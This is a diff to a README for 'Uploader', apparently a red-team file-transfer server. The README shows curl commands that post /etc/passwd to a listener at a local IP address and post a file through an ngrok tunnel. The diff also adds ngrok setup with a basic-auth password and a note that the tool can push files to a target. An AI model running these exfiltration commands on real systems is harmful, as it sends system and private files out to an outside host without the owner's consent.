@@ -29,10 +29,34 @@ Press CTRL+C to quit
 ```
 
 ## In Browser
-![image](https://github.com/deeexcee-io/Uploader/assets/130473605/4f3c4fa9-ae62-4daa-99e4-d604d10a0001)
+Can Upload and also Download Files to the Target if needed
+
+![image](https://github.com/deeexcee-io/Uploader/assets/130473605/30baa38a-1a2b-4d4d-a8cc-5909cbcbca1d)
+
 
 ## Command Line
 ```bash
 curl -L -s -X POST -F "file=@/etc/passwd" http://192.168.0.29:8000
 File uploaded!
+
+curl -L -s -X POST -F "file=@ips.txt" https://854d-11-11-11-11.ngrok-free.app
+
 ```
+## ngrok Setup if accessing over the Internet
+
+```
+python Uploader.py -H 127.0.0.1 -P 5000 --upload-folder C:\Uploader\Files
+
+.\ngrok.exe http 5000 --basic-auth="gd:SuperPassword"
+```
+
+![ngrok](https://github.com/deeexcee-io/Uploader/assets/130473605/269b7883-4615-469a-b958-5b15cdc0d668)
+
+Enter Creds and you're good
+
+![image](https://github.com/deeexcee-io/Uploader/assets/130473605/30baa38a-1a2b-4d4d-a8cc-5909cbcbca1d)
+
+
+
+
+
